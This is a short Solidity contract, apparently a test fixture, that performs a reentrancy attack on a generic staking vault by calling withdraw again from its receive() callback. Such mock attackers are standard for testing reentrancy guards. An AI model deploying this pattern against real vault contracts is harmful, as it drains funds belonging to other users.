// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IStakingVault {
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function claimRewards() external;
    function balances(address account) external view returns (uint256);
    function stakingToken() external view returns (address);
}

contract ReentrantAttacker {
    IStakingVault public vault;
    uint256 public attackAmount;
    bool public attacking;

    constructor(address _vault) {
        vault = IStakingVault(_vault);
    }

    function stake(uint256 amount) external {
        IERC20(vault.stakingToken()).approve(address(vault), amount);
        vault.stake(amount);
    }

    function attackWithdraw(uint256 _amount) external {
        attackAmount = _amount;
        attacking = true;
        vault.withdraw(_amount);
        attacking = false;
    }

    function attackClaimRewards() external {
        attacking = true;
        vault.claimRewards();
        attacking = false;
    }

    // Callback that tries to re-enter withdraw during the external call
    receive() external payable {
        if (attacking && address(vault).balance > 0) {
            vault.withdraw(attackAmount);
        }
    }
}
